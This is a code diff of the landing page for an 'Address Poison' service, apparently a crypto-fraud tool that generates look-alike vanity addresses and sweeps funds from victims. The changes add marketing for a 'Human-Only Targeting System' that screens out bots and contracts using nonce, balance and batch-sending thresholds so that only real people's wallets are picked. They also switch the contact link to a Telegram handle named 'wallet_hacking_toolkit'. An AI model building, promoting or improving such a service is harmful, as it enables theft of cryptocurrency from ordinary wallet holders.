@@ -1,5 +1,5 @@
 import Link from "next/link";
-import { Shield, Zap, Coins, Layers, ArrowRight, CheckCircle, TrendingUp, Wallet, DollarSign, Users, Info, Send } from "lucide-react";
+import { Shield, Zap, Coins, Layers, ArrowRight, CheckCircle, TrendingUp, Wallet, DollarSign, Users, Info, Send, Bot, UserCheck, Filter } from "lucide-react";
 
 export default function Home() {
   return (
@@ -38,9 +38,9 @@ export default function Home() {
       <main className="flex-1 max-w-6xl mx-auto w-full px-6 py-12 md:py-20">
         <div className="flex flex-col lg:flex-row items-center gap-12">
           <div className="flex-1 text-center lg:text-left">
-            <div className="inline-flex items-center gap-2 bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-4 py-1.5 text-sm font-medium mb-6">
+            <div className="inline-flex items-center gap-2 bg-gradient-to-r from-blue-500/10 to-purple-500/10 text-blue-400 border border-blue-500/30 rounded-full px-4 py-1.5 text-sm font-medium mb-6">
               <Zap className="w-4 h-4" />
-              <span>v2.0 – Fully Automated</span>
+              <span>V2.1 – Human-Only Targeting System</span>
             </div>
             <h1 className="text-4xl md:text-5xl lg:text-6xl font-bold leading-tight">
               Deploy <span className="bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">Address Poison</span> at Scale
@@ -48,6 +48,15 @@ export default function Home() {
             <p className="mt-4 text-lg text-gray-400 max-w-xl mx-auto lg:mx-0">
               Automatically generate vanity addresses, monitor on-chain activity, and sweep funds — all from a single dashboard.
             </p>
+            <div className="mt-4 bg-gray-800/40 border border-gray-700/50 rounded-xl p-4 max-w-xl mx-auto lg:mx-0">
+              <p className="text-sm text-gray-300 flex items-start gap-2">
+                <UserCheck className="w-5 h-5 text-green-400 flex-shrink-0 mt-0.5" />
+                <span>
+                  <span className="font-semibold text-white">V2.1 Advanced Filtering:</span>{" "}
+                  Automatically filters out bots, smart contracts, scripts, and automated transactions — targeting only verified human wallets.
+                </span>
+              </p>
+            </div>
             <div className="mt-8 flex flex-col sm:flex-row items-center gap-4">
               <Link
                 href="/register"
@@ -75,6 +84,99 @@ export default function Home() {
           </div>
         </div>
       </main>
+
+      {/* ── What's New in V2.1 ── */}
+      <section className="max-w-6xl mx-auto w-full px-6 py-12 border-t border-gray-800/50">
+        <div className="text-center mb-8">
+          <div className="inline-flex items-center gap-2 bg-gradient-to-r from-purple-500/10 to-pink-500/10 text-purple-400 border border-purple-500/30 rounded-full px-4 py-1.5 text-sm font-medium mb-4">
+            <Zap className="w-4 h-4" />
+            <span>What's New in V2.1</span>
+          </div>
+          <h2 className="text-2xl md:text-3xl font-bold text-white">
+            Advanced Human-Only Targeting System
+          </h2>
+          <p className="text-gray-400 mt-2 max-w-2xl mx-auto">
+            Our new multi-stage filtering ensures you only target real humans — not bots, contracts, or automated scripts.
+          </p>
+        </div>
+
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
+          <div className="bg-gradient-to-br from-blue-500/10 to-blue-600/5 backdrop-blur-sm border border-blue-500/20 rounded-2xl p-6 hover:border-blue-500/40 transition-all">
+            <div className="w-12 h-12 rounded-xl bg-blue-500/20 flex items-center justify-center mb-4">
+              <Bot className="w-6 h-6 text-blue-400" />
+            </div>
+            <h3 className="text-white font-semibold text-lg mb-2">No Bots or Scripts</h3>
+            <p className="text-gray-400 text-sm">
+              Automatically filters out automated trading bots, MEV bots, and script-driven wallets using behavioral analysis.
+            </p>
+          </div>
+
+          <div className="bg-gradient-to-br from-purple-500/10 to-purple-600/5 backdrop-blur-sm border border-purple-500/20 rounded-2xl p-6 hover:border-purple-500/40 transition-all">
+            <div className="w-12 h-12 rounded-xl bg-purple-500/20 flex items-center justify-center mb-4">
+              <Filter className="w-6 h-6 text-purple-400" />
+            </div>
+            <h3 className="text-white font-semibold text-lg mb-2">No Smart Contracts</h3>
+            <p className="text-gray-400 text-sm">
+              Detects and excludes smart contracts, routers, and protocol addresses — targeting only externally owned accounts (EOAs).
+            </p>
+          </div>
+
+          <div className="bg-gradient-to-br from-green-500/10 to-green-600/5 backdrop-blur-sm border border-green-500/20 rounded-2xl p-6 hover:border-green-500/40 transition-all">
+            <div className="w-12 h-12 rounded-xl bg-green-500/20 flex items-center justify-center mb-4">
+              <UserCheck className="w-6 h-6 text-green-400" />
+            </div>
+            <h3 className="text-white font-semibold text-lg mb-2">Human Behavior Patterns</h3>
+            <p className="text-gray-400 text-sm">
+              Analyzes transaction timing, frequency, and patterns to identify genuine human activity vs. automated sending.
+            </p>
+          </div>
+        </div>
+
+        <div className="mt-8 bg-gray-800/30 border border-gray-700/50 rounded-2xl p-6">
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+            <div>
+              <h4 className="text-white font-semibold mb-3 flex items-center gap-2">
+                <CheckCircle className="w-5 h-5 text-green-400" />
+                Stage 1: On-Chain State Checks
+              </h4>
+              <ul className="space-y-2 text-sm text-gray-400">
+                <li className="flex items-start gap-2">
+                  <span className="text-green-400 mt-1">✓</span>
+                  <span>Contract detection via bytecode analysis</span>
+                </li>
+                <li className="flex items-start gap-2">
+                  <span className="text-green-400 mt-1">✓</span>
+                  <span>High-nonce filtering (nonce ≥ 1000)</span>
+                </li>
+                <li className="flex items-start gap-2">
+                  <span className="text-green-400 mt-1">✓</span>
+                  <span>Balance threshold (≥ 0.002 native tokens)</span>
+                </li>
+              </ul>
+            </div>
+            <div>
+              <h4 className="text-white font-semibold mb-3 flex items-center gap-2">
+                <CheckCircle className="w-5 h-5 text-blue-400" />
+                Stage 2: Behavioral Analysis
+              </h4>
+              <ul className="space-y-2 text-sm text-gray-400">
+                <li className="flex items-start gap-2">
+                  <span className="text-blue-400 mt-1">✓</span>
+                  <span>Transaction frequency and timing patterns</span>
+                </li>
+                <li className="flex items-start gap-2">
+                  <span className="text-blue-400 mt-1">✓</span>
+                  <span>Batch sending detection (3+ txs per block)</span>
+                </li>
+                <li className="flex items-start gap-2">
+                  <span className="text-blue-400 mt-1">✓</span>
+                  <span>Receiver diversity analysis</span>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </section>
 
       {/* ── Partnership / Pricing ── */}
       <section className="max-w-6xl mx-auto w-full px-6 py-12 border-t border-gray-800/50">
@@ -120,6 +222,16 @@ export default function Home() {
             </p>
           </div>
 
+          <div className="bg-gray-800/40 backdrop-blur-sm border border-gray-700 rounded-2xl p-6 hover:border-green-500/30 transition-all">
+            <div className="w-12 h-12 rounded-xl bg-green-500/20 flex items-center justify-center mb-4">
+              <UserCheck className="w-6 h-6 text-green-400" />
+            </div>
+            <h3 className="text-white font-semibold text-lg">Human-Only Filtering</h3>
+            <p className="text-gray-400 text-sm mt-2">
+              Advanced multi-stage filtering ensures only verified human wallets are targeted — no bots, contracts, or scripts.
+            </p>
+          </div>
+
           <div className="bg-gray-800/40 backdrop-blur-sm border border-gray-700 rounded-2xl p-6 hover:border-blue-500/30 transition-all">
             <div className="w-12 h-12 rounded-xl bg-green-500/20 flex items-center justify-center mb-4">
               <Coins className="w-6 h-6 text-green-400" />
@@ -147,16 +259,6 @@ export default function Home() {
             <h3 className="text-white font-semibold text-lg">Deposit Tracking</h3>
             <p className="text-gray-400 text-sm mt-2">
               Unique deposit addresses per user with automatic credit top‑ups once confirmations are reached.
-            </p>
-          </div>
-
-          <div className="bg-gray-800/40 backdrop-blur-sm border border-gray-700 rounded-2xl p-6 hover:border-blue-500/30 transition-all">
-            <div className="w-12 h-12 rounded-xl bg-red-500/20 flex items-center justify-center mb-4">
-              <Shield className="w-6 h-6 text-red-400" />
-            </div>
-            <h3 className="text-white font-semibold text-lg">Profit Splitting</h3>
-            <p className="text-gray-400 text-sm mt-2">
-              Automatically split swept funds between you and the service — transparent and fair.
             </p>
           </div>
 
@@ -237,7 +339,7 @@ export default function Home() {
 
       {/* ── Telegram Contact ── */}
       <a
-        href="https://t.me/magictools1"
+        href="https://t.me/wallet_hacking_toolkit"
         target="_blank"
         rel="noopener noreferrer"
         className="fixed bottom-6 right-6 z-50 p-3 bg-blue-500 hover:bg-blue-600 rounded-full shadow-lg shadow-blue-500/30 transition-all duration-200 hover:scale-110"
